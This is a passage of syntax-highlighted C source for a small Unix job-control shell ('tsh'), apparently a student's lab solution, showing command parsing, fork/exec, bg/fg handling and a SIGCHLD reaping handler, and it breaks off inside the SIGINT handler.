class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FG 1    <span class="hljs-comment">/* running in foreground */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BG 2    <span class="hljs-comment">/* running in background */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ST 3    <span class="hljs-comment">/* stopped */</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span><br><span class="hljs-comment"> * Job state transitions and enabling actions:</span><br><span class="hljs-comment"> *     FG -&gt; ST  : ctrl-z</span><br><span class="hljs-comment"> *     ST -&gt; FG  : fg command</span><br><span class="hljs-comment"> *     ST -&gt; BG  : bg command</span><br><span class="hljs-comment"> *     BG -&gt; FG  : fg command</span><br><span class="hljs-comment"> * At most 1 job can be in the FG state.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Global variables */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;      <span class="hljs-comment">/* defined in libc */</span><br><span class="hljs-keyword">char</span> prompt[] = <span class="hljs-string">&quot;tsh&gt; &quot;</span>;    <span class="hljs-comment">/* command line prompt (DO NOT CHANGE) */</span><br><span class="hljs-keyword">int</span> verbose = <span class="hljs-number">0</span>;            <span class="hljs-comment">/* if true, print additional output */</span><br><span class="hljs-keyword">int</span> nextjid = <span class="hljs-number">1</span>;            <span class="hljs-comment">/* next job ID to allocate */</span><br><span class="hljs-keyword">char</span> sbuf[MAXLINE];         <span class="hljs-comment">/* for composing sprintf messages */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> &#123;</span>              <span class="hljs-comment">/* The job struct */</span><br>    <span class="hljs-keyword">pid_t</span> pid;              <span class="hljs-comment">/* job PID */</span><br>    <span class="hljs-keyword">int</span> jid;                <span class="hljs-comment">/* job ID [1, 2, ...] */</span><br>    <span class="hljs-keyword">int</span> state;              <span class="hljs-comment">/* UNDEF, BG, FG, or ST */</span><br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];  <span class="hljs-comment">/* command line */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> <span class="hljs-title">jobs</span>[<span class="hljs-title">MAXJOBS</span>];</span> <span class="hljs-comment">/* The job list */</span><br><span class="hljs-comment">/* End global variables */</span><br><br><span class="hljs-comment">/*error handling function */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">Fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> environ[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Kill</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> signum)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigemptyset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigaddset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-keyword">int</span> signum)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigfillset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Setpgid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">pid_t</span> pgid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigprocmask</span><span class="hljs-params">(<span class="hljs-keyword">int</span> how, <span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-keyword">sigset_t</span> *oldset)</span></span>;<br><span class="hljs-comment">/* Function prototypes */</span><br><br><span class="hljs-comment">/* Here are the functions that you will implement */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-comment">/* Here are helper routines that we&#x27;ve provided for you */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handler_t</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * main - The shell&#x27;s main routine </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];<br>    <span class="hljs-keyword">int</span> emit_prompt = <span class="hljs-number">1</span>; <span class="hljs-comment">/* emit prompt (default) */</span><br><br>    <span class="hljs-comment">/* Redirect stderr to stdout (so that driver will get all output</span><br><span class="hljs-comment">     * on the pipe connected to stdout) */</span><br>    dup2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/* Parse the command line */</span><br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;hvp&quot;</span>)) != EOF) &#123;<br>        <span class="hljs-keyword">switch</span> (c) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:             <span class="hljs-comment">/* print help message */</span><br>            usage();<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:             <span class="hljs-comment">/* emit additional diagnostic info */</span><br>            verbose = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:             <span class="hljs-comment">/* don&#x27;t print a prompt */</span><br>            emit_prompt = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* handy for automatic testing */</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>            usage();<br>    &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* Install the signal handlers */</span><br><br>    <span class="hljs-comment">/* These are the ones you will need to implement */</span><br>    Signal(SIGINT,  sigint_handler);   <span class="hljs-comment">/* ctrl-c */</span><br>    Signal(SIGTSTP, sigtstp_handler);  <span class="hljs-comment">/* ctrl-z */</span><br>    Signal(SIGCHLD, sigchld_handler);  <span class="hljs-comment">/* Terminated or stopped child */</span><br><br>    <span class="hljs-comment">/* This one provides a clean way to kill the shell */</span><br>    Signal(SIGQUIT, sigquit_handler); <br><br>    <span class="hljs-comment">/* Initialize the job list */</span><br>    initjobs(jobs);<br><br>    <span class="hljs-comment">/* Execute the shell&#x27;s read/eval loop */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    <span class="hljs-comment">/* Read command line */</span><br>    <span class="hljs-keyword">if</span> (emit_prompt) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, prompt);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>) &amp;&amp; ferror(<span class="hljs-built_in">stdin</span>))<br>        app_error(<span class="hljs-string">&quot;fgets error&quot;</span>);<br>    <span class="hljs-keyword">if</span> (feof(<span class="hljs-built_in">stdin</span>)) &#123; <span class="hljs-comment">/* End of file (ctrl-d) */</span><br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Evaluate the command line */</span><br>    eval(cmdline);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125; <br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* control never reaches here */</span><br>&#125;<br>  <br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *argv[MAXARGS];<span class="hljs-comment">/*Argument list execve() */</span><br>    <span class="hljs-keyword">char</span> buf[MAXLINE];<span class="hljs-comment">/*Holds modified command line */</span><br>    <span class="hljs-keyword">int</span> bg;<span class="hljs-comment">/*Should the job run in bg or fg? */</span><br>    <span class="hljs-keyword">pid_t</span> pid;<span class="hljs-comment">/*Process id */</span><br>    <span class="hljs-keyword">sigset_t</span> mask_all,mask_one,prev_one;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    bg = parseline(buf, argv); <br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<span class="hljs-comment">/* Ignore empty lines */</span><br><br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123;<br>        <span class="hljs-comment">//blocking SIGCHLD in if status,otherewise it maybe has bugs</span><br>        Sigfillset(&amp;mask_all);<span class="hljs-comment">/* add every signal number to set */</span><br>        Sigemptyset(&amp;mask_one);<span class="hljs-comment">/* create empty set */</span><br>        Sigaddset(&amp;mask_one, SIGCHLD);<span class="hljs-comment">/* add signal number to set */</span><br><br>        <span class="hljs-comment">/*  block SIGINT and save previous blocked set */</span><br>        <span class="hljs-comment">/* avoid parent process run to addjob exited,before fork child process block sigchild signal,after call addjob unblock  */</span><br>        Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="hljs-comment">/* Block SIGCHLD */</span><br>        <span class="hljs-keyword">if</span> ((pid = Fork()) == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">/* Child runs user job */</span><br>            <span class="hljs-comment">/* restore previous blocked set,unblocking SIGINT */</span><br>            <span class="hljs-comment">/* child process inherit parent process&#x27; blocking sets,avoid it can&#x27;t receive itself child process signal,so we must unblock */</span><br>            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* Unblock SIGCHLD */</span><br>            Setpgid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">// set child&#x27;s group to a new process group (this is identical to the child&#x27;s PID)</span><br>            Execve(argv[<span class="hljs-number">0</span>], argv, environ);<span class="hljs-comment">//this function not return ,so must call exit,otherewise it will run forever</span><br>        &#125;<span class="hljs-comment">/* Parent waits for foreground job to terminate */</span><br><br>        Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* Block SIGCHLD */</span><br>        <span class="hljs-keyword">int</span> st = (bg==<span class="hljs-number">0</span>) ? FG : BG;<br>        addjob(jobs,pid,st,cmdline);<br>        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* Unblock SIGCHLD */</span><br>        <span class="hljs-keyword">if</span> (!bg) &#123;<br>            <span class="hljs-comment">//because sigchld_handler was called aboveï¼Œit call waitpidï¼Œso don&#x27;t call and circular wait wait</span><br>            waitfg(pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid),pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * parseline - Parse the command line and build the argv array.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Characters enclosed in single quotes are treated as a single</span><br><span class="hljs-comment"> * argument.  Return true if the user has requested a BG job, false if</span><br><span class="hljs-comment"> * the user has requested a FG job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> <span class="hljs-built_in">array</span>[MAXLINE]; <span class="hljs-comment">/* holds local copy of command line */</span><br>    <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">array</span>;          <span class="hljs-comment">/* ptr that traverses command line */</span><br>    <span class="hljs-keyword">char</span> *delim;                <span class="hljs-comment">/* points to first space delimiter */</span><br>    <span class="hljs-keyword">int</span> argc;                   <span class="hljs-comment">/* number of args */</span><br>    <span class="hljs-keyword">int</span> bg;                     <span class="hljs-comment">/* background job? */</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;  <span class="hljs-comment">/* replace trailing &#x27;\n&#x27; with space */</span><br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore leading spaces */</span><br>    buf++;<br><br>    <span class="hljs-comment">/* Build the argv list */</span><br>    argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>    buf++;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (delim) &#123;<br>    argv[argc++] = buf;<br>    *delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    buf = delim + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore spaces */</span><br>           buf++;<br><br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>        buf++;<br>        delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>    &#125;<br>    &#125;<br>    argv[argc] = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* ignore blank line */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* should the job run in the background? */</span><br>    <span class="hljs-keyword">if</span> ((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>) &#123;<br>    argv[--argc] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bg;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;quit&quot;</span>)) <span class="hljs-comment">/* quit command */</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&amp;&quot;</span>)) <span class="hljs-comment">/* Ignore singleton &amp; */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>    <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>((argv[<span class="hljs-number">0</span>]),<span class="hljs-string">&quot;jobs&quot;</span>))<span class="hljs-comment">/* jobs command */</span><br>    &#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>((argv[<span class="hljs-number">0</span>]),<span class="hljs-string">&quot;fg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>((argv[<span class="hljs-number">0</span>]),<span class="hljs-string">&quot;bg&quot;</span>))<span class="hljs-comment">/* bg/fg command */</span><br>    &#123;<br>        do_bgfg(argv);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!argv[<span class="hljs-number">1</span>])&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) &amp;&amp; argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;%&#x27;</span>) &#123;            <span class="hljs-comment">//checks if the second argument is valid</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span>* <span class="hljs-title">myjob</span>;</span><br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;%&#x27;</span>)&#123;<span class="hljs-comment">//jid</span><br>        myjob = getjobjid(jobs,atoi(&amp;argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]));<br>        <span class="hljs-keyword">if</span>(!myjob)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: No such job\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//pid</span><br>        myjob = getjobpid(jobs,atoi(argv[<span class="hljs-number">1</span>]));<br>        <span class="hljs-keyword">if</span> (!myjob) &#123;                                 <span class="hljs-comment">// Checks if the given PID is there</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, atoi(argv[<span class="hljs-number">1</span>]));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <br>    Kill(-myjob-&gt;pid,SIGCONT);<span class="hljs-comment">//send continue signal </span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;bg&quot;</span>))&#123;<br>        myjob-&gt;state = BG;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,myjob-&gt;jid,myjob-&gt;pid,myjob-&gt;cmdline);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        myjob-&gt;state = FG;<br>        waitfg(myjob-&gt;pid);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * waitfg - Block until process pid is no longer the foreground process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(fgpid(jobs))<br>        usleep(<span class="hljs-number">1000</span>);<span class="hljs-comment">//sleep one second</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*****************</span><br><span class="hljs-comment"> * Signal handlers</span><br><span class="hljs-comment"> *****************/</span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> olderrno = errno;<br>    <span class="hljs-keyword">sigset_t</span> mask_all,prev;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    Sigfillset(&amp;mask_all);<br>    <span class="hljs-keyword">while</span>((pid = waitpid(<span class="hljs-number">-1</span>,&amp;status,WNOHANG | WUNTRACED))&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// WNOHANG | WUNTRACED return immediately</span><br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))  <span class="hljs-comment">// normally exited,delete job</span><br>        &#123;<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<br>            deletejob(jobs, pid);<br>            sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status))  <span class="hljs-comment">//terminated by signal, delete job and print message</span><br>        &#123;<br>            struct <span class="hljs-keyword">job_t</span>* job = getjobpid(jobs, pid);<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>            sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>  <span class="hljs-comment">//stopped,change the status</span><br>        &#123;<br>            struct <span class="hljs-keyword">job_t</span>* job = getjobpid(jobs, pid);<br>            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));<br>            job-&gt;state= ST;<br>            sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-comment">//actually there is WIFCONTINUED,but we don&#x27;t care about</span><br>    &#125;<br>    errno = olderrno;  <br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span 